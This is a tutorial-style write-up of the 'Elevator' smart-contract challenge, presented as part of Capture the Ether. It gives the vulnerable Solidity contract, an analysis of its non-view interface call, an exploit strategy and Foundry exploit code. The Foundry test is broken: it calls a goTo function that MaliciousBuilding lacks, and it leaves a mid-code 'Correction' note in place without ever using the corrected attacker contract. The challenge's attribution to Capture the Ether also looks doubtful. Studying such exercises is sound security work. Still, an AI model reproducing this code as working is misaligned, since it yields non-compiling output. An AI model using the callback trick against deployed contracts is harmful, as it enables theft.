# Capture the Ether: Miscellaneous Category

## Introduction
The Miscellaneous category covers a wide range of vulnerabilities that don't fit neatly into Math or Lotteries. These challenges test your understanding of Solidity quirks, interface manipulation, and creative logic bypasses.

## Challenge: The Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

**Goal:** Set the `top` variable to `true`.

**Vulnerability Analysis:**
```text
The contract calls `building.isLastFloor(_floor)` twice.
1. First call: inside the `if` condition. It must return `false` to enter the block.
2. Second call: to set the `top` variable. It must return `true` to set `top = true`.

Wait, how can the same function return different values for the same input?
Notice the interface: `function isLastFloor(uint256) external returns (bool);`
It is NOT marked as `view` or `pure`!

In Solidity, if a function is not explicitly marked `view`, the compiler
does not enforce it. A malicious contract can change its state and return
different values on subsequent calls.
```

**Exploit Strategy:**
```text
Step 1: Create an attacker contract that implements the `Building` interface.
Step 2: In the `isLastFloor` function, keep a boolean flag.
Step 3: The first time it's called, return `false` and flip the flag.
Step 4: The second time it's called (in the same transaction), return `true`.
```

**Exploit Contract (Foundry):**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/CaptureTheEther/Elevator.sol";

contract MaliciousBuilding {
    bool private flag = false;

    function isLastFloor(uint256) external returns (bool) {
        // First call returns false, second call returns true
        flag = !flag;
        return flag;
    }
}

contract ElevatorExploitTest is Test {
    Elevator public target;
    MaliciousBuilding public attacker;

    function setUp() public {
        target = new Elevator();
        attacker = new MaliciousBuilding();
    }

    function test_ExploitElevator() public {
        console.log("Top before:", target.top());

        // Call goTo from the attacker contract
        // msg.sender inside Elevator will be the attacker contract
        attacker.goTo(10); // Wait, we need to call target.goTo from attacker

        // Correction: The attacker must call target.goTo
        // Let's fix the attacker contract:
    }
}

// Correct Attacker Contract:
contract ElevatorAttacker {
    Elevator public target;
    bool private flag = false;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        flag = !flag;
        return flag;
    }

    function attack() public {
        target.goTo(10);
    }
}
```

**Key Takeaways from Misc:**
- **View is not enforced:** External calls to interfaces not marked `view` can modify state and return inconsistent values.
- **Trust no external calls:** Even simple getter functions can be malicious if the contract is controlled by an attacker.
- **State changes in getters:** A function returning a boolean can secretly change the contract's state.
- **Lesson learned:** Always mark functions that don't modify state as `view` or `pure`, and never trust the return value of an external contract blindly.
- **Next up:** The real boss battles - Damn Vulnerable DeFi!